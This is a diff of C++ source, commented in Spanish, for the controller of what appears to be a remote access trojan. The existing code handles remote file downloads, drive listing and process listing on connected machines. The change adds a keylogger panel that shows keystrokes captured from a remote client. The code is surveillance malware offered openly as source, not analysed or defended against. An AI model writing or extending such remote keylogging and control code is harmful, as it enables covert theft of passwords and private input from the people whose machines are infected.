@@ -5,6 +5,7 @@
 #include "frame_client.hpp"
 #include "panel_file_manager.hpp"
 #include "panel_process_manager.hpp"
+#include "panel_keylogger.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -29,16 +30,13 @@ void Cliente_Handler::Spawn_Handler(){
             break;
         }
 
-        //this->Log(std::to_string(iRecibido) + " bytes recibidos");
-        //this->Log(cBuffer);
-
         std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 1);
         if (vcDatos.size() == 0) {
             this->Log("No se pudo procesar el buffer");
             continue;
         }
 
-        //Descarga de archivos aqui
+        //Prioridad para descarga de archivos
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
             vcDatos = strSplit(std::string(cBuffer), '\\', 2);
             // CMD + 2 slashs /  +len del id
@@ -135,7 +133,7 @@ void Cliente_Handler::Spawn_Handler(){
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Discos_Lista)) {
             char* pBuf = cBuffer + 4;
-            std::vector<std::string> vDrives = strSplit(std::string(pBuf), '\\', 100); //maximo 100 por ahora, pero se deberia de incrementar en un futuro
+            std::vector<std::string> vDrives = strSplit(std::string(pBuf), '\\', 100);
 
             if (vDrives.size() > 0) {
                 ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
@@ -213,11 +211,21 @@ void Cliente_Handler::Spawn_Handler(){
             continue;
         }
 
-        //Lista de procesos
         if (vcDatos[0] == std::to_string(EnumComandos::PM_Lista)) {
             panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel, this->n_Frame);
             if (panel_proc) {
                 panel_proc->listManager->AgregarData(vcDatos[1], this->p_Cliente._strPID);
+            }
+            continue;
+        }
+
+        if (vcDatos[0] == std::to_string(EnumComandos::KL_Salida)) {
+            panelKeylogger* temp_panel = (panelKeylogger*)wxWindow::FindWindowById(EnumIDS::ID_KL_Panel, this->n_Frame);
+            if (temp_panel) {
+                char* cKeyData = cBuffer + (vcDatos[0].size() + 1);
+                temp_panel->txt_Data->AppendText(cKeyData);
+            }else {
+                this->Log("[X] No se pudo encontrar el panel keylogger");
             }
             continue;
         }
